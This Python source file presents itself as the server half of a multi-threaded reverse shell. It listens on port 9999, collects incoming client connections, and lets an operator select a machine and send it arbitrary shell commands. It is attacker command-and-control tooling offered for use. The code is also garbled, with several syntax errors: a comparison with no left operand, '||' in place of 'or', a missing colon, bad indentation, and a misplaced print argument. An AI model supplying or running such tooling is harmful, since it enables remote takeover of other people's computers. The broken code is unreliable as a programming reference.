# Python3 Multi-Threaded Reverse Shell - Server.py

import socket
import threading
import sys
import time
from queue import Queue

# Setup threading
NUMBER_OF_THREADS = 2
JOB_ID = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket
def socket_create():
  try:
    global host
    global port
    global s
    host = ''
    port = 9999
    s = socket.socket()
  except socket.error as msg:
      print("Socket Creation Error: " + str(msg))


# Bind socket to port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding to Port " + str(port))
        s.bind((host, port))
        s.listen(5) # Number of Bad Connections to Allow before Refusing
    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\nRetrying...")
        time.sleep(3)
        socket_bind()


# Accept connections for multiple clients
def accept_connections():
    # Clean up old connections before starting
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1) # Do not timeout
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection Established: " + address[0])
        except:
            print("Error accepting connections")


# Interactive prompt for remote sessions
def start_shell():
    while 1:
        cmd = input("remote> ")
        if == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_connection(cmd)
            if conn is not None:
                send_shell_commands(conn)
        else:
            print("Command Not Found...")


# Print a list of active connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(''))
            conn.recv(20480)
        except: # If a connection fails, remove it
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + "   " + str(all_addresses[i][0]) + "    " + str(all_addresses[i][1]) + '\n'
    print("----- Remote Clients -----" + "\n" + results)


# Select a connection returned by list_connections()
def get_connection(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target] # Connect to the selected clients
        print("Now Connected: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0] + "> ", end=""))
        return conn
    except:
        print("Invalid Client")
        return None


# Pass commands to the client
def send_shell_commands(conn):
    while 1:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == "quit" || cmd == "exit"
                break
        except:
            print("Connection Lost")
            break


# Setup worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # Kill the thread when the program exits
        t.start()


# Do the next job in the queue
 def work():
     while 1:
          x = queue.get()
          if x == 1:
              socket_create()
              socket_bind()
              accept_connections()
          if x == 2:
              start_shell()
          queue.task_done()



# Create jobs
def create_jobs():
      for x in JOB_ID:
          queue.put(x)
      queue.join


# Doooo it
create_workers()
create_jobs()